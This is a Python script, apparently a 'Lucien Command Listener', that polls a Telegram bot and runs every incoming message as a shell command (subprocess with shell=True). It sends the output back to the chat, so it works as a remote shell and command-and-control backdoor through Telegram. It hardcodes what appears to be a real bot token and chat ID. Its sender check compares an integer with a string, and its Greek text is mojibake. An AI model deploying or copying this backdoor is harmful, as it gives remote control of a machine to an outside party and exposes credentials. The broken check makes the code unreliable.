import requests
import subprocess
import time

# === Î¡Î¥Î˜ÎœÎ™Î£Î•Î™Î£ ===
TOKEN = "7573715897:AAGgNmOxIOrRywzihuF4jFYkBTU9ymvwgn0"
CHAT_ID = "1837395252"

URL = f"https://api.telegram.org/bot{TOKEN}/"
last_update_id = 0

def send_message(text):
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(URL + "sendMessage", data=data)

def get_updates():
    global last_update_id
    try:
        params = {"offset": last_update_id + 1, "timeout": 10}
        response = requests.get(URL + "getUpdates", params=params)
        result = response.json()["result"]
        return result
    except Exception as e:
        print("Î£Ï†Î¬Î»Î¼Î± ÏƒÏ„Î¿ get_updates:", e)
        return []

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return output.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8")
    except Exception as e:
        return f"Î£Ï†Î¬Î»Î¼Î±: {str(e)}"

# === MAIN LOOP ===
print("ðŸ›° Lucien Command Listener ÎµÎ½ÎµÏÎ³ÏŒÏ‚.")
send_message("ðŸ›° Lucien Command Listener ÎµÎ½ÎµÏÎ³ÏŒÏ‚.")

while True:
    updates = get_updates()
    for update in updates:
        last_update_id = update["update_id"]
        message = update.get("message", {})
        text = message.get("text", "")
        sender_id = message.get("from", {}).get("id", 0)

        print(f"[{sender_id}] -> {text}")  # DEBUG

        if sender_id != CHAT_ID:
            send_message("â›” Î†ÏÎ½Î·ÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.")
            continue

        if not text:
            continue

        result = execute_command(text)
        if not result.strip():
            result = "âœ… Î•Î½Ï„Î¿Î»Î® ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ Ï‡Ï‰ÏÎ¯Ï‚ Î­Î¾Î¿Î´Î¿."
        elif len(result) > 4000:
            result = result[:4000] + "\n...Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï€ÎµÏÎ¹ÎºÏŒÏ€Î·ÎºÎµ."

        send_message(f"ðŸ“¤ Î‘Ï€Î¬Î½Ï„Î·ÏƒÎ·:\n{result}")
    time.sleep(2)
